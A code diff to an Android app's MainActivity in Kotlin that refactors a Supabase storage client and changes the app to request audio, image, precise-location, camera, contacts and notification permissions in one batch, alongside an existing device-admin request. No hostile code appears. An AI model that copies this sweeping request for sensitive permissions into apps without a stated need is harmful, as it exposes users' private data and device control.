@@ -21,17 +21,11 @@ import androidx.compose.foundation.layout.fillMaxSize
 import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.Surface
 import androidx.compose.ui.Modifier
+import androidx.fragment.app.FragmentActivity
 
-class MainActivity : ComponentActivity() {
+class MainActivity : FragmentActivity() {
     private lateinit var policyManager: PolicyManager
-    private val supabase: SupabaseClient by lazy {
-        createSupabaseClient(
-            supabaseUrl = SupabaseConfig.SUPABASE_URL,
-            supabaseKey = SupabaseConfig.SUPABASE_ANON_KEY
-        ) {
-            install(Storage)
-        }
-    }
+    public val supabase: SupabaseClient = SupabaseConfig.client
 
     override fun onCreate(savedInstanceState: Bundle?) {
         enableEdgeToEdge()
@@ -57,31 +51,33 @@ class MainActivity : ComponentActivity() {
         policyManager.checkAndRequestAdminRights()
         BatteryDataRepository.init(this)
 
-        val audioPermission =
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-                Manifest.permission.READ_MEDIA_AUDIO
-            else
-                Manifest.permission.READ_EXTERNAL_STORAGE
+        val audioPermission = Manifest.permission.READ_MEDIA_AUDIO
 
-        val imagesPermission =
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-                Manifest.permission.READ_MEDIA_IMAGES
-            else
-                Manifest.permission.READ_EXTERNAL_STORAGE
+        val imagesPermission = Manifest.permission.READ_MEDIA_IMAGES
 
-        val locationPermission =
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-                Manifest.permission.ACCESS_FINE_LOCATION
-            else
-                Manifest.permission.ACCESS_COARSE_LOCATION
+        val locationPermission = Manifest.permission.ACCESS_FINE_LOCATION
+
+        val cameraPermission = Manifest.permission.CAMERA
+
+        val contactsPermission = Manifest.permission.READ_CONTACTS
 
         val launcher = registerForActivityResult(
-            ActivityResultContracts.RequestPermission()
-        ) {}
+            ActivityResultContracts.RequestMultiplePermissions()
+        ) { permissions ->
+            permissions.entries.forEach {
+                println("${it.key} is granted: ${it.value}")
+            }
+        }
 
-        launcher.launch(audioPermission)
-        launcher.launch(imagesPermission)
-        launcher.launch(locationPermission)
+        launcher.launch(
+            arrayOf(
+                audioPermission,
+                imagesPermission,
+                locationPermission,
+                cameraPermission,
+                contactsPermission
+            )
+        )
 
         // MP4-Dateien von 'Other' nach 'videos' verschieben
         // Erste 100 Dateien in Unterordner '1' verschieben
@@ -146,16 +142,14 @@ class MainActivity : ComponentActivity() {
         }
 
         // Permissions für Notifications prüfen (Android 13+)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
-                != PackageManager.PERMISSION_GRANTED
-            ) {
-                ActivityCompat.requestPermissions(
-                    this,
-                    arrayOf(Manifest.permission.POST_NOTIFICATIONS),
-                    101
-                )
-            }
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
+            != PackageManager.PERMISSION_GRANTED
+        ) {
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(Manifest.permission.POST_NOTIFICATIONS),
+                101
+            )
         }
     }
 }
